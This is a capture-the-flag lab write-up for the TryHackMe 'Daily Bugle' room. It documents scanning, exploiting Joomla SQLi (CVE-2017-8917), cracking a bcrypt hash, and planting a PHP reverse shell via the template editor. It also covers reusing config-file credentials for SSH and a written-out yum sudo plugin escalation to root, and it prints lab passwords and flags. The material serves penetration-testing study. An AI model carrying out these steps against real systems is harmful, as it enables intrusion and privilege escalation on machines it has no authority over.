# Lab Report - Daily Bugle 


# Overview 
- **Difficulty**: Hard 
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/dailybugle

## Challenge Description 
>- **Compromise a Joomla CMS account via SQLi, practice cracking hashes and escalate your privileges by taking advantage of yum.**

## Resolution Summary 
**We discovered available services with an `Nmap` scan, revealing SSH, HTTP, and MySQL. We identified a `Joomla 3.7.0` CMS on the web application, which was vulnerable to SQLi (`CVE-2017-8917`). We exploited it with a Python script to extract a password hash, which we cracked with `JTR`. With the recovered credentials, we logged into the Joomla admin panel and injected a PHP reverse shell into a template file. In the web application directory, we found a `configuration.php` file containing credentials that allowed us to SSH as `jjameson`. Finally, we escalated to root by abusing a `sudo` misconfiguration on `yum`, using a malicious plugin via `GTFOBins`.**

# Information Gathering 
- **We began by scanning the target's network with `Nmap` in order to find online services, we also added the `-sV` flag to find low-hanging fruits (version's vulnerabilities):**
```bash
sudo nmap -sV 10.80.181.52
```
	- Note: adding the -p- flag did not provide additional results.

- **We uncovered the following services:**
```bash 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

- **To begin with, we decided to focus on the web application on port 80.**

## HTTP (80)
- **Upon inspecting the web application, we noticed that there is a login form available, we decided to launch `Burp Suite` in order to perform some manual testing.**
- **On the background, we launched Gobuster in order to find any hidden directory:**
```bash
gobuster dir -u http://10.80.181.52 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 64
```

- **This proved to be successful since we found the following directory:**
```bash
/administrator        (Status: 301) [Size: 242] [--> http://10.80.181.52/administrator/]
```

- **Which lead us to a Joomla login page:**
```bash
http://10.80.181.52/administrator/
```

- **After testing the login page with dummy credentials, we found that both login forms return the same error message, leading us to think that they may be linked.** 
- **This assumption is confirmed after manual testing testing on `Burp Suite Repeater`, because login attempts (from web app) return HTTP 303 code (See other) but attempts from the Joomla interface redirect us to the first login from (on the Daily Bugle web site).**

- **Hence, we focused on the Joomla login form.**

- **First, we tried to find the Joomla CMS version. For that purpose, we used the `Joomscan` tool:**
```bash
joomscan -u http://10.80.181.52
```

- **We found that the CMS version is `3.7.0`.** 
- **Next, we found that this version was vulnerable to SQLi on [exploit-db](https://www.exploit-db.com/), `CVE-2017-8917`**

# Exploitation 
- **We used the following [python script](https://github.com/teranpeterson/Joomblah) in order to exploit the SQLi vulnerability.** 
```bash
python3 joomblah.py http://10.81.142.103
```

- **We obtained the following results, which revealed usernames and a password hash:** 
```bash
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']  
```

- **First, we identified the hash format using [this](https://www.tunnelsup.com/hash-analyzer/) website.** 
- **We cracked the hash using `JTR` with the following command:** 
```bash 
john --wordlist=/home/kali/Downloads/rockyou.txt hash.txt --format=bcrypt
#Result 
spiderman123     (?)     
```

- **With the credentials `jonah:spiderman123`, we were able to authenticate on the login form at `http://10.81.142.103/administrator/`.**

- **Once we gained access to the Admin panel, the usual workflow is to inject malicious code in templates' files and then access the said file to gain a reverse shell.** 
- **In our case, we edition the `jsstrings.php` file in the `beez3` template, the file is located at:**
```bash
http://10.81.142.103/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA
```

- **Then we edited this `.php` file with the [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from `pentestmonkey`.** 

- **Finally, we visited the following URL and gained a reverse shell:**
```bash 
10.81.142.103/templates/beez3/jsstrings.php
```

# Privilege Escalation 
- **To begin with, we stabilized our current shell with:**
```bash 
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Use Ctrl + Z to background the shell
stty raw -echo; fg
```

- **In the web application directory (`/var/www/html`) we found a `configuration.php` file, which can host sensitive information, here we found two interesting strings:** 
	- **` public $password = 'nv5uz9r3ZEDzVjNu';`**
	- **`public $secret = 'UAMBRWzHO3oFPmVC';`**

- **We tried those passwords in order to login as `jjameson` (user found with `cat /etc/passwd`) on the SSH server:**
```bash
jjameson@10.81.142.103
```

- **The following pair of credentials allowed us to connect to the SSH server:**
	- **`jjameson:nv5uz9r3ZEDzVjNu`**

- **We got access to the user flag:**
	- **`user.txt:27a260fe3cba712cfdedb1c86d80442e`**

- **In order to elevate our privileges, we ran `sudo -l`, which produced the following results:**
```bash
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

- **We looked for an attack vector on `GTFOBins`, we found and executed the following lines of code which allowed us to gain root access:** 
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
#Verify with 
whoami
```

# Trophy 
**User.txt → `27a260fe3cba712cfdedb1c86d80442e`** 

**Root.txt → `eec3d53292b1821868266858d7fa6f79`**

# Lessons Learned
- Every time you find a password, always **spray it** to every username !!! 
- Look for **public exploits** on **GitHub**. 
- Discovered **yum**, new privilege escalation vector: a root-package manager. 
